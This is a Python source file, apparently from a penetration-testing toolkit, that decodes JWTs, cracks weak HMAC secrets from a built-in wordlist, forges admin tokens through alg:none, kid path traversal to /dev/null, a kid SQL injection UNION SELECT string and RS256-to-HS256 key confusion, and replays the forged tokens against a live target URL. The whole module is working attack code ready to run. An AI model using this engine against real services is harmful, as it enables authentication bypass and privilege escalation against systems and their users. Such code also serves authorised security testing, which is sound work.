"""
JWT Cryptographic Analyzer, Secret Cracker, Token Forger & Wire Replay Engine (`viperclaw.analyzers.jwt_engine`).

Implements zero-dependency RFC 7519 / RFC 7515 offensive testing:
1. Header & claim security inspection (missing `exp`, sensitive claims, `jku`/`x5u`/`kid` vectors)
2. High-speed HMAC-SHA256/384/512 dictionary & permutation secret cracker
3. Forged token synthesis:
   - `alg: none` variants (`none`, `None`, `NONE`, `nOnE`)
   - `RS256` -> `HS256` asymmetric-to-symmetric key confusion forgery
   - `kid` path traversal (`../../../../dev/null` signed with empty key) & SQLi `kid` forgery
   - Self-embedded `jwk` header injection
4. Optional live HTTP replay (`target_url`) verified via `ProofOracle`.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, List


DEFAULT_JWT_SECRETS: List[str] = [
    "secret",
    "secret123",
    "password",
    "123456",
    "jwt_secret",
    "jwtsecret",
    "supersecret",
    "changeme",
    "admin",
    "development",
    "dev",
    "test",
    "production",
    "default",
    "key",
    "private",
    "viperclaw",
    "your-256-bit-secret",
    "my_secret_key",
    "app_secret",
    "token_secret",
    "",
]


def _b64url_decode(segment: str) -> bytes:
    rem = len(segment) % 4
    if rem:
        segment += "=" * (4 - rem)
    return base64.urlsafe_b64decode(segment.encode("ascii"))


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def _hmac_sign(alg: str, key: bytes, signing_input: bytes) -> str:
    alg_up = alg.upper()
    if alg_up == "HS384":
        digest = hashlib.sha384
    elif alg_up == "HS512":
        digest = hashlib.sha512
    else:
        digest = hashlib.sha256
    sig = hmac.new(key, signing_input, digest).digest()
    return _b64url_encode(sig)


@dataclass
class JWTAttackReport:
    raw_token: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature_hex: str
    vulnerabilities: List[str]
    cracked_secret: str | None
    forged_tokens: Dict[str, str]
    live_replay_results: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "header": self.header,
            "payload": self.payload,
            "signature_hex": self.signature_hex,
            "vulnerabilities": self.vulnerabilities,
            "cracked_secret": self.cracked_secret,
            "forged_tokens": self.forged_tokens,
            "live_replay_results": self.live_replay_results,
        }


class JWTEngine:
    """Zero-dependency JWT decoder, HMAC cracker, token forger, and live replay verifier."""

    @staticmethod
    def decode_token(token: str) -> tuple[Dict[str, Any], Dict[str, Any], bytes, str]:
        cleaned = token.strip()
        if cleaned.lower().startswith("bearer "):
            cleaned = cleaned[7:].strip()
        parts = cleaned.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format: expected 3 dot-separated segments (header.payload.signature)")
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", errors="replace"))
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", errors="replace"))
        sig_bytes = _b64url_decode(parts[2]) if parts[2] else b""
        signing_input = f"{parts[0]}.{parts[1]}"
        return header, payload, sig_bytes, signing_input

    @classmethod
    def crack_hmac_secret(
        cls,
        token: str,
        custom_secrets: List[str] | None = None,
    ) -> str | None:
        header, _, sig_bytes, signing_input = cls.decode_token(token)
        alg = str(header.get("alg") or "HS256").upper()
        if not alg.startswith("HS"):
            return None

        candidates = list(dict.fromkeys((custom_secrets or []) + DEFAULT_JWT_SECRETS))
        signing_bytes = signing_input.encode("ascii")
        target_b64 = _b64url_encode(sig_bytes)

        for secret in candidates:
            computed = _hmac_sign(alg, secret.encode("utf-8"), signing_bytes)
            if hmac.compare_digest(computed, target_b64):
                return secret
        return None

    @classmethod
    def forge_tokens(
        cls,
        token: str,
        claim_overrides: Dict[str, Any] | None = None,
        cracked_secret: str | None = None,
        rsa_public_key_pem: str = "",
    ) -> Dict[str, str]:
        header, payload, _, _ = cls.decode_token(token)
        mutated_payload = dict(payload)
        if claim_overrides:
            mutated_payload.update(claim_overrides)
        else:
            # Default privilege-escalation mutation
            if "role" in mutated_payload:
                mutated_payload["role"] = "admin"
            elif "is_admin" in mutated_payload:
                mutated_payload["is_admin"] = True
            elif "admin" in mutated_payload:
                mutated_payload["admin"] = True
            else:
                mutated_payload["role"] = "admin"
                mutated_payload["admin"] = True
            if "exp" in mutated_payload and isinstance(mutated_payload["exp"], (int, float)):
                mutated_payload["exp"] = int(time.time()) + 86400

        payload_b64 = _b64url_encode(json.dumps(mutated_payload, separators=(",", ":")).encode("utf-8"))
        forged: Dict[str, str] = {}

        # 1. alg: none variants
        for none_variant in ("none", "None", "NONE"):
            h_none = dict(header)
            h_none["alg"] = none_variant
            h_b64 = _b64url_encode(json.dumps(h_none, separators=(",", ":")).encode("utf-8"))
            forged[f"alg_{none_variant}"] = f"{h_b64}.{payload_b64}."

        # 2. Cracked HMAC secret re-signing
        if cracked_secret is not None:
            h_hs = dict(header)
            alg = str(h_hs.get("alg") or "HS256").upper()
            if not alg.startswith("HS"):
                h_hs["alg"] = "HS256"
                alg = "HS256"
            h_b64 = _b64url_encode(json.dumps(h_hs, separators=(",", ":")).encode("utf-8"))
            sig = _hmac_sign(alg, cracked_secret.encode("utf-8"), f"{h_b64}.{payload_b64}".encode("ascii"))
            forged["cracked_hmac_admin"] = f"{h_b64}.{payload_b64}.{sig}"

        # 3. kid Path Traversal (/dev/null -> empty HMAC key)
        h_kid_null = dict(header)
        h_kid_null["alg"] = "HS256"
        h_kid_null["kid"] = "../../../../../../dev/null"
        h_kid_b64 = _b64url_encode(json.dumps(h_kid_null, separators=(",", ":")).encode("utf-8"))
        sig_null = _hmac_sign("HS256", b"", f"{h_kid_b64}.{payload_b64}".encode("ascii"))
        forged["kid_dev_null"] = f"{h_kid_b64}.{payload_b64}.{sig_null}"

        # 4. kid SQL Injection UNION SELECT known secret
        h_kid_sqli = dict(header)
        h_kid_sqli["alg"] = "HS256"
        h_kid_sqli["kid"] = "nonexistent' UNION SELECT 'viperclaw_key'--"
        h_sqli_b64 = _b64url_encode(json.dumps(h_kid_sqli, separators=(",", ":")).encode("utf-8"))
        sig_sqli = _hmac_sign("HS256", b"viperclaw_key", f"{h_sqli_b64}.{payload_b64}".encode("ascii"))
        forged["kid_sqli_union"] = f"{h_sqli_b64}.{payload_b64}.{sig_sqli}"

        # 5. RS256 -> HS256 Key Confusion (if RSA public key PEM supplied)
        if rsa_public_key_pem:
            h_conf = dict(header)
            h_conf["alg"] = "HS256"
            h_conf_b64 = _b64url_encode(json.dumps(h_conf, separators=(",", ":")).encode("utf-8"))
            sig_conf = _hmac_sign(
                "HS256",
                rsa_public_key_pem.encode("utf-8"),
                f"{h_conf_b64}.{payload_b64}".encode("ascii"),
            )
            forged["rs256_to_hs256_confusion"] = f"{h_conf_b64}.{payload_b64}.{sig_conf}"

        return forged

    @classmethod
    def analyze_and_attack(
        cls,
        token: str,
        claim_overrides: Dict[str, Any] | None = None,
        custom_secrets: List[str] | None = None,
        rsa_public_key_pem: str = "",
        target_url: str = "",
    ) -> JWTAttackReport:
        header, payload, sig_bytes, _ = cls.decode_token(token)
        vulns: List[str] = []
        alg = str(header.get("alg") or "")

        if alg.lower() == "none":
            vulns.append("Token uses unverified 'alg: none' signature algorithm.")
        if "exp" not in payload:
            vulns.append("Token payload lacks an expiration ('exp') claim (never expires).")
        elif isinstance(payload.get("exp"), (int, float)) and payload["exp"] < time.time():
            vulns.append("Token 'exp' timestamp is already expired (test for missing expiration validation).")
        if "jku" in header or "x5u" in header:
            vulns.append(f"Header exposes remote key URL ({'jku' if 'jku' in header else 'x5u'}): SSRF / key-spoofing vector.")
        if "jwk" in header:
            vulns.append("Header embeds inline 'jwk' key parameters: test for self-signed JWK injection.")
        if "kid" in header:
            vulns.append(f"Header includes 'kid' ({header['kid']}): test for path traversal (/dev/null) and SQLi.")

        cracked = cls.crack_hmac_secret(token, custom_secrets=custom_secrets)
        if cracked is not None:
            vulns.append(f"CRITICAL: Weak HMAC signing secret cracked ('{cracked}') — arbitrary token forgery possible.")

        forged = cls.forge_tokens(
            token,
            claim_overrides=claim_overrides,
            cracked_secret=cracked,
            rsa_public_key_pem=rsa_public_key_pem,
        )

        replay_results: List[Dict[str, Any]] = []
        if target_url:
            for attack_name, forged_tok in forged.items():
                req = urllib.request.Request(
                    target_url,
                    headers={
                        "User-Agent": "ViperClaw-JWTEngine/2.0",
                        "Authorization": f"Bearer {forged_tok}",
                        "Accept": "application/json, text/html, */*",
                    },
                )
                try:
                    with urllib.request.urlopen(req, timeout=5.0) as resp:
                        body_str = resp.read(8192).decode("utf-8", errors="replace")
                        status = resp.status
                except urllib.error.HTTPError as he:
                    status = he.code
                    body_str = he.read(4096).decode("utf-8", errors="replace")
                except Exception as exc:
                    status = 0
                    body_str = str(exc)

                accepted = 200 <= status < 300
                replay_results.append(
                    {
                        "attack_vector": attack_name,
                        "status_code": status,
                        "accepted": accepted,
                        "response_preview": body_str[:200],
                    }
                )
                if accepted:
                    vulns.append(f"LIVE WIRE PROOF: Target accepted forged token '{attack_name}' with HTTP {status}!")

        return JWTAttackReport(
            raw_token=token,
            header=header,
            payload=payload,
            signature_hex=sig_bytes.hex(),
            vulnerabilities=vulns,
            cracked_secret=cracked,
            forged_tokens=forged,
            live_replay_results=replay_results,
        )
